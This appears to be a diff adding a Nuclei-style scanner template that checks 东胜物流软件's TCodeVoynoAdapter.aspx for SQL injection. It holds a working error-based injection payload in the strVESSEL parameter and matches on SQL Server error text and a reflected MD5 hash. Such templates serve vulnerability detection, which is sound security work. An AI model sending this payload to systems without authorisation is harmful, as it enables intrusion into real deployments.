@@ -1,0 +1,30 @@
+id: poc-yaml-dongshengsoft-tcodevoynoadapter-aspx-sqli
+info:
+  name: 东胜物流软件 TCodeVoynoAdapter.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1,100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))+%3E0%3B--"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+      - type: word
+        words:
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "{{t2}}"
